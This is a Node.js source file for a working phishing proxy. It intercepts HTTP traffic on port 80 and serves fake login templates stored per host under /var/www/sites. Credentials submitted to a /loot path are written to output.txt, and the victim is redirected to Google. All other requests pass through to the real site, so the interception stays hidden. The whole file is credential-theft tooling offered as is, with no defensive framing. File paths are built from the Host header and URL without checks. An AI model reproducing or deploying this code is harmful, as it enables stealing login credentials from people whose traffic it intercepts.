const http = require('http');
const fs = require('fs');
const url = require('url');


http.createServer((incomingRequest, endResponse) => {

	// CASE 1: Deal with phishing form requests
	if (incomingRequest.url.match(/^\/loot/)){
		saveCredentials(incomingRequest);
		endResponse.statusCode = 302;
		endResponse.setHeader("Location", "www.google.fr");
		return endResponse.end();
	}

	// Check if requested file match one of the fake templates we have.
	fs.lstat("/var/www/sites/" + incomingRequest.headers.host + incomingRequest.url , (err, stats) => {

		if (!err){
			if (stats.isFile()){
				// CASE 2: We have a template to inject for this specific request. 
				// We create the template and write the content as a response.
				return createTemplate("/var/www/sites/" + incomingRequest.headers.host + incomingRequest.url, (injected) => {
					return endResponse.end(injected); 
				});
			}
		}	

		// CASE 3: This is a regular request and we don't have anything to inject. So we just proxy it.
		console.log("Proxying request...");

		// The forged "cloned" request options. We copy the headers, the url, method and host from the original request.
		var requestOptions = {
			host: incomingRequest.headers.host,
			path: incomingRequest.url,
			port: 80,
			method: incomingRequest.method,
			headers: incomingRequest.headers,
		};

		// Start the request.
		const clonedRequest = http.request(requestOptions, (serverResponse) => {

			// This callback is executed after the cloned request has been sent.
			
			// We can already retrieve the status code from the server, we need to copy them to the final response.
			endResponse.statusCode = serverResponse.statusCode;
			
			// ...and the headers.
			Object.entries(serverResponse.headers).forEach((header) => {
				endResponse.setHeader(header[0], header[1]);
			});


			// this is for the body. we also need to set a listener and wait for data to go through the stream.
			serverResponse.on('data', (data) => {
				// pipe it to the final response.
				return endResponse.write(data);
			});

			// when the server has ended the transmission.
			serverResponse.on('end', () => {
				// ... we end the final response.
				return endResponse.end();
			});
		});

		// read eventual data (body of the request) from the original request.
		incomingRequest.on('data', (data) => {
			// write it through the clone request.
			return clonedRequest.write(data);
		});


		// when there's no more data to read, end the cloned request stream.
		incomingRequest.on('end', () => {
			return clonedRequest.end();
		});
	});
	

}).listen(80);


function createTemplate(website, callback){
	fs.readFile(website, (err, data) => {
		return callback(data ? data : "");
	});
}

function saveCredentials(requestObject){
	var query = url.parse(requestObject.url, true).query;
	fs.writeFile("output.txt", query.username + ":" + query.password + " ("+ requestObject.headers.host +")\r\n", () => {});
}
